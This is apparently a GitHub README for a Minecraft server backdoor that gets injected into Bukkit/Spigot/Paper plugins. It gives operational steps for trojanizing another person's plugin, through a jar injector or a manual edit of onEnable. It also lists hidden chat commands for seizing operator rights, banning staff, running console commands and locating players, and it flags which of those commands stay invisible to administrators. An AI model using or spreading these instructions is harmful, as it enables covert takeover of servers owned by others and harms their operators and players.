



# Thicc Industries' Minecraft Backdoor

A silent, customizable backdoor for Minecraft Bukkit/Spigot/Paper servers.

Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

This is pretty much a finished project in my mind, but if you come up with something cool feel free to throw a pull request.
## Requirements:
### Injector:
* Java 8 runtime.
* Desired target plugin jar file.
* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
### Manual Injection:
* Java 8 JDK.
* Desired plugin source code.
* Plugin dependencies.
* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
## Usage instructions:

### Injector:
* Run backdoor-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: #)

### Manual Injection:

* Download source code for desired plugin, and open in editor of your choice.
* Merge ``com.thiccindustries.backdoor`` folder into the plugin's source.
* Open the Plugin's main source file, The file's class definition should look like this: 
``public class Something extends JavaPlugin{}``
* Add the following line to the top of the file:
``import com.thiccindustries.backdoor``
* Find the ``@Override public void onEnable(){}`` method.
* Add the following line to the beginning of the method:
``new Backdoor(this, [Your UUID Here], [Your Chat Prefix Here]);``
* Change other configuration options in Config.java as desired.
* Compile plugin.

## Commands
Default command prefix is ``#``,  this can be changed.
* #op - Give player operator status
* #deop - Remove player's operator status
* #ban -  Ban player
* #banip - IP ban player
* #gamemode / gm - Change gamemode
* #give - Give items
* #32k - Enchant item in hand with level 32k enchants.
* #exec - Execute a command as the server console. **[Visible]**
* #chaos - Deop and Ban all ops currently online. Give admin to everyone else. **[Visible]**
* #seed - Find world seed
* #coords - Find player coordinates
* #tp - Teleport to coordinates **[Visible, See below.]**
* #auth - authorize new user
* #deauth - deauthorize user
* #help - List all available commands, with syntax and description.

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Some strange things happen with the #tp command when teleporting a large distance (to the world border, etc). This may be noticable by other players on the server. Teleporting small distances seems to be safe.

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.

Oh and also don't yell at me if someone breaks your server with this, its your fault for installing some random person's plugin. Be smarter than that.
